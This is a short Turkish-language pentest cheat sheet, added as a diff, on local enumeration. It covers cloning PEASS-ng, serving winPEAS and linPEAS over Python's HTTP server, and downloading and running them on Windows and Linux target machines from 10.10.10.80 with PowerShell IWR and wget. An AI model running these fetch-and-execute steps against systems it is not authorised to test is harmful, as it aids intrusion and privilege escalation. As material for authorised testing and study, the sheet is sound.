@@ -1,0 +1,46 @@
+LOCAL ENUMERATION
+
+
+PEASS uygulamasını indirin:
+
+cd /opt
+git clone https://github.com/carlospolop/PEASS-ng
+
+
+-------------------------------------------------
+
+
+Windows ve Linux için olan script'lerini bir araya getirin.
+
+Windows x64 için olan:	/opt/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+Linux için olan:	/opt/PEASS-ng/linPEAS/linpeas.sh
+
+
+-------------------------------------------------
+
+
+Bir arada oldukları dizini Python ile serv edin. (Farklı bir portta yayınlamak için  python -m SimpleHTTPServer portnumarası  şeklinde kullanabilirsiniz.)
+
+python -m SimpleHTTPServer
+
+
+-------------------------------------------------
+
+
+Windows hedef makine için, Windows shell'den aşağıdaki komutla %temp% dizini içine download edin; ardıdan cd %temp ile Temp dizinine gidip exe'yi çalıştırın. (IP'yi düzeltmeyi unutmayın.)
+
+powershell.exe -command IWR -Uri http://10.10.10.80:8000/winPEASx64.exe -OutFile %temp%\winPEASx64.exe
+cd %temp%
+winpeasx64.exe
+
+
+-------------------------------------------------
+
+
+Linux hedefe makine için de, Linux shell'den aşağıdaki komutla /tmp dizini içine gidin ve download edin. Ardından çalışma izni verip çalıştırın. (IP'yi düzeltmeyi unutmayın.)
+
+wget http://10.10.10.80:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+
